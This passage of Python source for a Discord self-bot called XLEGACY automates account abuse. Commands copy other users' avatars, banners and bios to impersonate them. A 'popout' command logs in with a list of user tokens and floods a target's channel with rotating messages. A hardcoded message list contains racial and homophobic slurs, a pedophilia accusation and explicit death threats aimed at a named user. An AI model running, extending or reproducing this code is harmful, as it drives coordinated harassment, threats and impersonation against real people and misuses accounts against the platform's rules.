
                if update_response.status_code == 200:
                    await ctx.send(f"```ansi\n{red} XLEGACY | BIO STOLEN |  {reset}\n```")
                else:
                    await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO STEAL BIO | {update_response.status_code} |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | NO BIO TO COPY |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO GET USER DATA | {response.status_code} |  {reset}\n```")

    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")

@bot.command()
async def popout(ctx, user: discord.Member):
    await ctx.message.delete()   
    if not user:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION A USER |  {reset}\n```")
        return
        
    popout_status[ctx.author.id] = {
        'running': True,
        'target': user
    }
    
    used_messages = set()
    all_messages = load_outlast_messages()  # Use outlast_messages.txt
    tokens_list = load_tokens()
    active_tokens = []
    
    print(f"\n{red}=== STARTING POPOUT COMMAND ==={reset}")
    print(f"{red}Target User: {user.name}{reset}")
    print(f"{red}Checking tokens...{reset}")
    
    for token in tokens_list:
        if len(active_tokens) >= 5:
            print(f"\n{red}SOCIAL WAS HERE | POP OUT PUSSY 😂{reset}")
            break
            
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://discord.com/api/v9/channels/{ctx.channel.id}', headers=headers) as resp:
                    if resp.status == 200:
                        await asyncio.sleep(0.5)
                        try:
                            client = discord.Client()
                            await client.login(token, bot=False)
                            channel = await client.fetch_channel(ctx.channel.id)
                            
                            active_tokens.append({
                                'token': token,
                                'client': client,
                                'channel': channel
                            })
                            print(f"{green}[+] Token {token[-4:]} ready ({len(active_tokens)}/5){reset}")                           
                        except:
                            print(f"{light_red}[-] Token {token[-4:]} failed to initialize{reset}")
                            if 'client' in locals():
                                await client.close()
                    else:
                        print(f"{light_red}[-] Token {token[-4:]} no access{reset}")
        except Exception as e:
            print(f"{light_red}[-] Token {token[-4:]} error: {str(e)}{reset}")
            
        await asyncio.sleep(0.5)
            
            
    if not active_tokens:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO VALID TOKENS WITH CHANNEL ACCESS |  {reset}\n```")
        return

    print(f"\n{red}Working Tokens: {len(active_tokens)}{reset}")
    current_token_index = 0
    messages_sent = 0

    async def send_message_group():
        nonlocal current_token_index, used_messages, messages_sent
        
        messages_to_send = []
        for _ in range(4):
            available_messages = [msg for msg in all_messages if msg not in used_messages]
            if not available_messages:
                used_messages.clear()
                available_messages = all_messages
                print(f"\n{red}=== REFRESHING MESSAGE LIST ==={reset}")
            
            message = random.choice(available_messages)
            used_messages.add(message)
            messages_to_send.append(message)

        messages_to_send = [msg.replace("{username}", user.display_name) for msg in messages_to_send]

        current_token = active_tokens[current_token_index]
        try:
            print(f"\n{red}=== USING TOKEN {current_token_index + 1}/{len(active_tokens)} ==={reset}")
            
            channel = current_token['channel']
            
            for message in messages_to_send:
                await channel.send(message)
                messages_sent += 1
                print(f"{green}Message sent ({messages_sent}/4): {message}{reset}")
                await asyncio.sleep(random.uniform(0.55555, .8888888))
            
            if messages_sent >= 4:
                messages_sent = 0
                current_token_index = (current_token_index + 1) % len(active_tokens)
                print(f"\n{red}UNHOLY WAS HERE | SWITCHING TO TOKEN {current_token_index + 1}/{len(active_tokens)}{reset}")
                
        except Exception as e:
            print(f"\n{light_red}!!! UNEXPECTED ERROR TOKEN {current_token_index + 1}: {str(e)} !!!{reset}")
            current_token_index = (current_token_index + 1) % len(active_tokens)
            messages_sent = 0

    try:
        while ctx.author.id in popout_status and popout_status[ctx.author.id]['running']:
            await send_message_group()
            await asyncio.sleep(0.1)
    finally:
        for token_data in active_tokens:
            try:
                if token_data['client']:
                    await token_data['client'].close()
            except:
                pass

    print(f"\n{red}🔪=== KILLED THAT HOE ASS NIGGA 😂 ===🗡️{reset}\n")

@bot.command()
async def popoutstop(ctx):
    if ctx.author.id in popout_status:
        popout_status[ctx.author.id]['running'] = False
        del popout_status[ctx.author.id]
        await ctx.send(f"```ansi\n{red} XLEGACY | POPOUT STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO POPOUT RUNNING |  {reset}\n```")

        # Add to global variables
DISCORD_HEADERS = {
    "standard": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-discord-timezone": "America/New_York",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDY4NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }
    # ... (keep all the other header presets from your original code)
}

@bot.command()
async def account(ctx):
    msg = await ctx.send("Loading.")
    help_content = f"""
{red}Account & Profile Commands{reset}
{light_red}[ {red}1{light_red} ] {black}stealpfp <@user>       {light_red}[ {red}2{light_red} ] {black}stealbanner <@user>   
{light_red}[ {red}3{light_red} ] {black}setname <name>        {light_red}[ {red}4{light_red} ] {black}copyprofile <@user>  
{light_red}[ {red}5{light_red} ] {black}pbackup               {light_red}[ {red}6{light_red} ] {black}setpfp <url>         
{light_red}[ {red}7{light_red} ] {black}setbanner <url>      

{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
"""
    await msg.edit(content=f"```ansi\n{help_content}```")

@bot.command()
async def stealpfp(ctx, user: discord.Member = None):
    if not user:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION A USER TO STEAL PFP |  {reset}\n```")
        return

    headers = DISCORD_HEADERS["standard"]

    avatar_format = "gif" if user.is_avatar_animated() else "png"
    avatar_url = str(user.avatar_url_as(format=avatar_format))

    async with aiohttp.ClientSession() as session:
        async with session.get(avatar_url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()

                payload = {
                    "avatar": f"data:image/{avatar_format};base64,{image_b64}"
                }

                async with session.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers) as resp:
                    if resp.status == 200:
                        await ctx.send(f"```ansi\n{red} XLEGACY | STOLE PFP | {user.name} |  {reset}\n```")
                    else:
                        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO STEAL PFP | {resp.status} |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO DOWNLOAD PFP |  {reset}\n```")

@bot.command()
async def stealbanner(ctx, user: discord.Member = None):
    if not user:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION A USER TO STEAL BANNER |  {reset}\n```")
        return

    headers = DISCORD_HEADERS["standard"]

    profile_url = f"https://discord.com/api/v9/users/{user.id}/profile"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(profile_url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                banner_hash = data.get("user", {}).get("banner")
                
                if not banner_hash:
                    await ctx.send(f"```ansi\n{red} XLEGACY | USER HAS NO BANNER |  {reset}\n```")
                    return
                
                banner_format = "gif" if banner_hash.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{banner_format}?size=1024"
                
                async with session.get(banner_url) as banner_response:
                    if banner_response.status == 200:
                        banner_data = await banner_response.read()
                        banner_b64 = base64.b64encode(banner_data).decode()
                        
                        payload = {
                            "banner": f"data:image/{banner_format};base64,{banner_b64}"
                        }
                        
                        async with session.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers) as resp:
                            if resp.status == 200:
                                await ctx.send(f"```ansi\n{red} XLEGACY | STOLE BANNER | {user.name} |  {reset}\n```")
                            else:
                                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO STEAL BANNER | {resp.status} |  {reset}\n```")
                    else:
                        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO DOWNLOAD BANNER |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH USER PROFILE |  {reset}\n```")

@bot.command()
async def setname(ctx, *, name: str = None):
    if not name:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE A NAME |  {reset}\n```")
        return

    headers = DISCORD_HEADERS["standard"]

    payload = {
        "global_name": name
    }

    async with aiohttp.ClientSession() as session:
        async with session.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers) as resp:
            if resp.status == 200:
                await ctx.send(f"```ansi\n{red} XLEGACY | NAME SET | {name} |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO SET NAME | {resp.status} |  {reset}\n```")

@bot.command()
async def copyprofile(ctx, user: discord.Member = None):
    if not user:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION A USER TO COPY PROFILE |  {reset}\n```")
        return

    headers = DISCORD_HEADERS["standard"]

    profile_url = f"https://discord.com/api/v9/users/{user.id}/profile"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(profile_url, headers=headers) as profile_response:
            if profile_response.status == 200:
                profile_data = await profile_response.json()
                
                avatar_url = str(user.avatar_url)
                async with session.get(avatar_url) as avatar_response:
                    if avatar_response.status == 200:
                        image_data = await avatar_response.read()
                        image_b64 = base64.b64encode(image_data).decode()
                        
                        avatar_payload = {
                            "avatar": f"data:image/png;base64,{image_b64}",
                            "global_name": profile_data.get('user', {}).get('global_name')
                        }
                        
                        await session.patch("https://discord.com/api/v9/users/@me", headers=headers, json=avatar_payload)

                        profile_payload = {
                            "bio": profile_data.get('bio', ""),
                            "pronouns": profile_data.get('pronouns', ""),
                            "accent_color": profile_data.get('accent_color')
                        }
                        
                        await session.patch("https://discord.com/api/v9/users/@me/profile", headers=headers, json=profile_payload)

                        await ctx.send(f"```ansi\n{red} XLEGACY | COPIED PROFILE | {user.name} |  {reset}\n```")
                    else:
                        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO DOWNLOAD AVATAR |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH PROFILE DATA |  {reset}\n```")

@bot.command()
async def pbackup(ctx):
    headers = DISCORD_HEADERS["standard"]

    if not hasattr(bot, 'profile_backup'):
        async with aiohttp.ClientSession() as session:
            async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as response:
                if response.status == 200:
                    profile_data = await response.json()
                    
                    avatar_url = str(ctx.author.avatar_url)
                    async with session.get(avatar_url) as avatar_response:
                        if avatar_response.status == 200:
                            image_data = await avatar_response.read()
                            image_b64 = base64.b64encode(image_data).decode()
                            
                            bot.profile_backup = {
                                "avatar": f"data:image/png;base64,{image_b64}",
                                "global_name": profile_data.get('global_name'),
                                "bio": profile_data.get('bio', ""),
                                "pronouns": profile_data.get('pronouns', ""),
                                "accent_color": profile_data.get('accent_color'),
                                "banner": profile_data.get('banner')
                            }
                            
                            await ctx.send(f"```ansi\n{red} XLEGACY | PROFILE BACKED UP |  {reset}\n```")
                        else:
                            await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO BACKUP AVATAR |  {reset}\n```")
                else:
                    await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH PROFILE DATA |  {reset}\n```")
    else:
        async with aiohttp.ClientSession() as session:
            async with session.patch("https://discord.com/api/v9/users/@me", json=bot.profile_backup, headers=headers) as resp:
                if resp.status == 200:
                    await ctx.send(f"```ansi\n{red} XLEGACY | PROFILE RESTORED |  {reset}\n```")
                    delattr(bot, 'profile_backup')
                else:
                    await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO RESTORE PROFILE | {resp.status} |  {reset}\n```")

@bot.command()
async def setpfp(ctx, url: str):
    headers = DISCORD_HEADERS["standard"]
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = response.headers.get('Content-Type', '')
                image_format = 'gif' if 'gif' in content_type else 'png'

                payload = {
                    "avatar": f"data:image/{image_format};base64,{image_b64}"
                }

                async with session.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers) as resp:
                    if resp.status == 200:
                        await ctx.send(f"```ansi\n{red} XLEGACY | PFP SET |  {reset}\n```")
                    else:
                        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO SET PFP | {resp.status} |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO DOWNLOAD IMAGE |  {reset}\n```")

@bot.command()
async def setbanner(ctx, url: str):
    headers = DISCORD_HEADERS["standard"]

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = response.headers.get('Content-Type', '')
                image_format = 'gif' if 'gif' in content_type else 'png'

                payload = {
                    "banner": f"data:image/{image_format};base64,{image_b64}"
                }

                async with session.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers) as resp:
                    if resp.status == 200:
                        await ctx.send(f"```ansi\n{red} XLEGACY | BANNER SET |  {reset}\n```")
                    else:
                        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO SET BANNER | {resp.status} |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO DOWNLOAD IMAGE |  {reset}\n```")


@bot.command()
async def vc(ctx):
    msg = await ctx.send(f"```ansi\n{red} XLEGACY | VC COMMANDS |  {reset}\n```")
    help_content = f"""
                {black}─────────────────────────────────────XLEGACY─────────────────────────
                           {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                {black}─────────────────────────────────────VC COMMANDS─────────────────────────{red}

{red}Voice Channel Management{reset}
{light_red}[ {red}1{light_red} ] {black}vcjoin stable <id>    {light_red}[ {red}2{light_red} ] {black}vcjoin rotate        
{light_red}[ {red}3{light_red} ] {black}vcjoin random         {light_red}[ {red}4{light_red} ] {black}vcjoin list          
{light_red}[ {red}5{light_red} ] {black}vcjoin leave          {light_red}[ {red}6{light_red} ] {black}vcjoin status        

{red}Multi-Token VC Control{reset}
{light_red}[ {red}7{light_red} ] {black}multivc <channel_id>  {light_red}[ {red}8{light_red} ] {black}vcend <channel_id>   
{light_red}[ {red}9{light_red} ] {black}vcstop               

{red}
 __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_|   
                                                  
                                                  

"""
    await msg.edit(content=f"```ansi\n{help_content}\n```")
    
@bot.group(invoke_without_command=True)
async def vcjoin(ctx):
    await ctx.send(f"```ansi\n{red} XLEGACY | VCJOIN COMMANDS |  {reset}\n```")
    help_content = f"""
{red}Voice Channel Join Commands{reset}
{light_red}[ {red}1{light_red} ] {black}vcjoin stable <channel_id> {light_red}[ {red}2{light_red} ] {black}vcjoin rotate        
{light_red}[ {red}3{light_red} ] {black}vcjoin random              {light_red}[ {red}4{light_red} ] {black}vcjoin list            
{light_red}[ {red}5{light_red} ] {black}vcjoin leave               {light_red}[ {red}6{light_red} ] {black}vcjoin status          
"""
    await ctx.send(f"```ansi\n{help_content}\n```")

@vcjoin.command(name="stable")
async def vc_stable(ctx, channel_id: int = None):
    if not channel_id:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE VOICE CHANNEL ID |  {reset}\n```")
        return
        
    try:
        channel = bot.get_channel(channel_id)
        if not channel or not isinstance(channel, discord.VoiceChannel):
            await ctx.send(f"```ansi\n{red} XLEGACY | INVALID VOICE CHANNEL ID |  {reset}\n```")
            return
            
        voice_client = ctx.guild.voice_client
        if voice_client:
            await voice_client.move_to(channel)
        else:
            await channel.connect()
            
        await ctx.send(f"```ansi\n{red} XLEGACY | CONNECTED TO VOICE CHANNEL | {channel.name} |  {reset}\n```")
    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR CONNECTING TO VC | {str(e)} |  {reset}\n```")

@vcjoin.command(name="list")
async def vc_list(ctx):
    voice_channels = [channel for channel in ctx.guild.channels if isinstance(channel, discord.VoiceChannel)]
    if not voice_channels:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO VOICE CHANNELS AVAILABLE |  {reset}\n```")
        return
        
    channel_list = []
    for i, channel in enumerate(voice_channels, 1):
        channel_list.append(f"{light_red}[ {red}{i}{light_red} ] {black}{channel.name} {light_red}(ID: {red}{channel.id}{light_red}){reset}")
    
    await ctx.send(f"```ansi\n{red} AVAILABLE VOICE CHANNELS {reset}\n\n" + "\n".join(channel_list) + "```")

@vcjoin.command(name="status")
async def vc_status(ctx):
    voice_client = ctx.guild.voice_client
    if voice_client and voice_client.channel:
        status_info = f"""
{red} VOICE CHANNEL STATUS {reset}
{light_red}Connected to: {red}{voice_client.channel.name}{reset}
{light_red}Channel ID: {red}{voice_client.channel.id}{reset}
{light_red}Latency: {red}{round(voice_client.latency * 1000, 2)}ms{reset}
{light_red}Members: {red}{len(voice_client.channel.members)}{reset}
"""
        await ctx.send(f"```ansi\n{status_info}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NOT CONNECTED TO VOICE CHANNEL |  {reset}\n```")

@vcjoin.command(name="leave")
async def vc_leave(ctx):
    voice_client = ctx.guild.voice_client
    if voice_client:
        await voice_client.disconnect()
        await ctx.send(f"```ansi\n{red} XLEGACY | LEFT VOICE CHANNEL |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NOT IN VOICE CHANNEL |  {reset}\n```")

@vcjoin.command(name="rotate")
async def vc_rotate(ctx):
    voice_channels = [channel for channel in ctx.guild.channels if isinstance(channel, discord.VoiceChannel)]
    if not voice_channels:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO VOICE CHANNELS AVAILABLE |  {reset}\n```")
        return
        
    rotate_active = True
    await ctx.send(f"```ansi\n{red} XLEGACY | STARTING VC ROTATION |  {reset}\n```")
    
    while rotate_active:
        for channel in voice_channels:
            try:
                voice_client = ctx.guild.voice_client
                if voice_client:
                    await voice_client.move_to(channel)
                else:
                    await channel.connect()
                    
                await ctx.send(f"```ansi\n{red} XLEGACY | MOVED TO CHANNEL | {channel.name} |  {reset}\n```")
                await asyncio.sleep(10)
                
                if not rotate_active:
                    break
                    
            except Exception as e:
                await ctx.send(f"```ansi\n{red} XLEGACY | ERROR ROTATING TO CHANNEL | {channel.name} |  {reset}\n```")
                continue

@vcjoin.command(name="random")
async def vc_random(ctx):
    voice_channels = [channel for channel in ctx.guild.channels if isinstance(channel, discord.VoiceChannel)]
    if not voice_channels:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO VOICE CHANNELS AVAILABLE |  {reset}\n```")
        return
        
    channel = random.choice(voice_channels)
    try:
        voice_client = ctx.guild.voice_client
        if voice_client:
            await voice_client.move_to(channel)
        else:
            await channel.connect()
            
        await ctx.send(f"```ansi\n{red} XLEGACY | JOINED RANDOM VOICE CHANNEL | {channel.name} |  {reset}\n```")
    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR JOINING RANDOM VC | {str(e)} |  {reset}\n```")

        # Add to global variables
guild_rotation_task = None
guild_rotation_delay = 2.0

@bot.group(invoke_without_command=True)
async def rotateguild(ctx, delay: float = 2.0):
    global guild_rotation_task, guild_rotation_delay
    
    if guild_rotation_task and not guild_rotation_task.cancelled():
        await ctx.send(f"```ansi\n{red} XLEGACY | GUILD ROTATION ALREADY RUNNING |  {reset}\n```")
        return
        
    if delay < 1.0:
        await ctx.send(f"```ansi\n{red} XLEGACY | DELAY MUST BE AT LEAST 1 SECOND |  {reset}\n```")
        return
        
    guild_rotation_delay = delay
    
    async def rotate_guilds():
        headers = {
            "authority": "canary.discord.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "authorization": bot.http.token,
            "content-type": "application/json",
            "origin": "https://canary.discord.com",
            "referer": "https://canary.discord.com/channels/@me",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }
        
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    valid_guild_ids = []
                    
                    async with session.get(
                        'https://canary.discord.com/api/v9/users/@me/guilds',
                        headers=headers
                    ) as guild_resp:
                        if guild_resp.status != 200:
                            await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH GUILDS |  {reset}\n```")
                            return
                        
                        guilds = await guild_resp.json()
                        
                        for guild in guilds:
                            test_payload = {
                                'identity_guild_id': guild['id'],
                                'identity_enabled': True
                            }
                            
                            async with session.put(
                                'https://canary.discord.com/api/v9/users/@me/clan',
                                headers=headers,
                                json=test_payload
                            ) as test_resp:
                                if test_resp.status == 200:
                                    valid_guild_ids.append(guild['id'])
                        
                        if not valid_guild_ids:
                            await ctx.send(f"```ansi\n{red} XLEGACY | NO GUILDS WITH VALID CLAN BADGES |  {reset}\n```")
                            return
                            
                        await ctx.send(f"```ansi\n{red} XLEGACY | FOUND {len(valid_guild_ids)} VALID GUILDS |  {reset}\n```")
                        
                        while True:
                            for guild_id in valid_guild_ids:
                                payload = {
                                    'identity_guild_id': guild_id,
                                    'identity_enabled': True
                                }
                                async with session.put(
                                    'https://canary.discord.com/api/v9/users/@me/clan',
                                    headers=headers,
                                    json=payload
                                ) as put_resp:
                                    if put_resp.status == 200:
                                        await asyncio.sleep(guild_rotation_delay)
                            
            except asyncio.CancelledError:
                raise
            except Exception as e:
                print(f"Error in guild rotation: {e}")
                await asyncio.sleep(5)
    
    guild_rotation_task = asyncio.create_task(rotate_guilds())
    await ctx.send(f"```ansi\n{red} XLEGACY | GUILD ROTATION STARTED | DELAY: {delay}s |  {reset}\n```")

@rotateguild.command(name="stop")
async def rotateguild_stop(ctx):    
    global guild_rotation_task
    
    if guild_rotation_task and not guild_rotation_task.cancelled():
        guild_rotation_task.cancel()
        guild_rotation_task = None
        await ctx.send(f"```ansi\n{red} XLEGACY | GUILD ROTATION STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO GUILD ROTATION RUNNING |  {reset}\n```")

@rotateguild.command(name="delay")
async def rotateguild_delay(ctx, delay: float):
    global guild_rotation_delay
    
    if delay < 1.0:
        await ctx.send(f"```ansi\n{red} XLEGACY | DELAY MUST BE AT LEAST 1 SECOND |  {reset}\n```")
        return
        
    guild_rotation_delay = delay
    await ctx.send(f"```ansi\n{red} XLEGACY | GUILD ROTATION DELAY SET | {delay}s |  {reset}\n```")

@rotateguild.command(name="status")
async def rotateguild_status(ctx):
    status = "RUNNING" if (guild_rotation_task and not guild_rotation_task.cancelled()) else "STOPPED"
    status_info = f"""
{red} GUILD ROTATION STATUS {reset}
{light_red}Status: {red}{status}{reset}
{light_red}Delay: {red}{guild_rotation_delay}s{reset}
{light_red}Task: {red}{'ACTIVE' if guild_rotation_task else 'INACTIVE'}{reset}
"""
    await ctx.send(f"```ansi\n{status_info}\n```")

# DM Snipe Configuration
try:
    with open('dmsnipe_config.json', 'r') as f:
        config = json.load(f)
except FileNotFoundError:
    config = {
        'webhook_url': None,
        'enabled': False,
        'edit_snipe': False,
        'ignored_users': [],
        'ignored_channels': []
    }

def save_config():
    with open('dmsnipe_config.json', 'w') as f:
        json.dump(config, f, indent=4)

@bot.group(invoke_without_command=True)
async def dmsnipe(ctx):
    await ctx.send(f"```ansi\n{red} XLEGACY | DM SNIPE COMMANDS | USE .HELP DMSNIPE |  {reset}\n```")

@dmsnipe.command()
async def log(ctx, webhook_url: str = None):
    if webhook_url is None:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE WEBHOOK URL |  {reset}\n```")
        return
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(webhook_url) as resp:
                if resp.status == 200:
                    config['webhook_url'] = webhook_url
                    save_config()
                    await ctx.send(f"```ansi\n{red} XLEGACY | WEBHOOK SET SUCCESSFULLY |  {reset}\n```")
                else:
                    await ctx.send(f"```ansi\n{red} XLEGACY | INVALID WEBHOOK URL |  {reset}\n```")
    except:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID WEBHOOK URL |  {reset}\n```")

@dmsnipe.command()
async def toggle(ctx):
    config['enabled'] = not config['enabled']
    save_config()
    status = "ENABLED" if config['enabled'] else "DISABLED"
    await ctx.send(f"```ansi\n{red} XLEGACY | DM SNIPE {status} |  {reset}\n```")

@dmsnipe.command()
async def status(ctx):
    status_info = f"""
{red} DM SNIPE CONFIGURATION {reset}
{light_red}Enabled: {red}{config['enabled']}{reset}
{light_red}Webhook Set: {red}{'YES' if config['webhook_url'] else 'NO'}{reset}
{light_red}Edit Snipe: {red}{config['edit_snipe']}{reset}
{light_red}Ignored Users: {red}{len(config['ignored_users'])}{reset}
{light_red}Ignored Channels: {red}{len(config['ignored_channels'])}{reset}
"""
    await ctx.send(f"```ansi\n{status_info}\n```")

    # Add to global variables
self_gcname = [
    "discord.gg/guest runs you LMFAO",
    "yo {user} wake the fuck up discord.gg/guest",
    "nigga your a bitch {user} discord.gg/guest",
    "pedophilic retard {user} discord.gg/guest",
    "{UPuser} STOP RUBBING YOUR NIPPLES LOL discord.gg/guest",
    "{UPuser} LOOOL HAILK DO SOMETHING RETARD discord.gg/guest",
    "{user} come die to prophet nigga discord.gg/guest",
    "{UPuser} ILL CAVE YOUR SKULL IN discord.gg/guest",
    "frail bitch discord.gg/guest",
    "{UPuser} I WILL KILL YOU LMFAO discord.gg/guest",
    "{user} nigga your slow as shit discord.gg/guest",
    "YO {user} WAKE THE FUCK UP discord.gg/guest",
    "DONT FAIL THE CHECK {UPuser} LOL discord.gg/guest",
    "who let this shitty nigga own a client?? discord.gg/guest",
    "faggot bitch stop rubbing your nipples to little girls discord.gg/guest",
    "leave = fold okay {user}? LMFAO discord.gg/guest",
    "{user} this shit isnt a dream LMFAO discord.gg/guest"
]

ugc_task = None
gctrap_enabled = False

@bot.command()
async def gctrap(ctx):
    msg = await ctx.send(f"```ansi\n{red} XLEGACY | GC TRAP COMMANDS |  {reset}\n```")
    help_content = f"""
                {black}─────────────────────────────────────XLEGACY─────────────────────────
                           {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                {black}─────────────────────────────────────GC TRAP─────────────────────────{red}

{red}Group Chat Trap Commands{reset}
{light_red}[ {red}1{light_red} ] {black}gctrap enable          {light_red}[ {red}2{light_red} ] {black}gctrap disable       
{light_red}[ {red}3{light_red} ] {black}gctrapconfig          {light_red}[ {red}4{light_red} ] {black}ugc <@user>          
{light_red}[ {red}5{light_red} ] {black}ugcend                {light_red}[ {red}6{light_red} ] {black}tleave <server_id>   

{red}
 __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_|   
                                                  
